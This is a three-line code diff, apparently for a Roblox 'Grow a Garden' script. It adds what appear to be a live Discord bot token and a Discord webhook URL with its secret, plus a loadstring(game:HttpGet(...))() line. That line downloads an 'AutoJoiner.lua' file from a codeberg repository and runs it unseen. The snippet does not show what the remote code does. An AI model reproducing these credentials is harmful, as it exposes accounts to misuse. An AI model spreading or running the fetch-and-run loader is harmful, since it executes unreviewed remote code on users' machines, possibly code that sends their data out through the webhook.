@@ -1,0 +1,3 @@
+Token = "NzQ3NzIyMDI4Mzk1NjU5MzE0.GXe9t-.P_B iCDBeUjKbK-DRPEMqujmsqBzjq5HXu1hN0Y"
+Webhook = "https://discord.com/api/webhooks/1399475849505280101/bv_XPVwiv0Epv_PwAuoKfRFSt2ItZll1KLEfMLwYAx-3e-3WHruQHhEP2_WTSdy6nx3w"
+loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/AutoJoiner.lua"))()
